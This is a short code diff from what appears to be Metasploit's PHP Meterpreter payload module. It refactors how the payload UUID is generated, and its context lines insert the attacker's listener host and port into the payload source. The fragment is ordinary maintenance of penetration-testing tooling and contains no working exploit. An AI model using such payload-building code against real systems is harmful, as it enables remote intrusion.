@@ -37,11 +37,7 @@ module Metasploit4
     met.gsub!("127.0.0.1", datastore['LHOST']) if datastore['LHOST']
     met.gsub!("4444", datastore['LPORT'].to_s) if datastore['LPORT']
 
-    uuid = Msf::Payload::UUID.new(
-      platform: 'php',
-      arch:     ARCH_PHP
-    )
-
+    uuid = generate_payload_uuid
     bytes = uuid.to_raw.chars.map { |c| '\x%.2x' % c.ord }.join('')
     met = met.sub("\"PAYLOAD_UUID\", \"\"", "\"PAYLOAD_UUID\", \"#{bytes}\"")
 
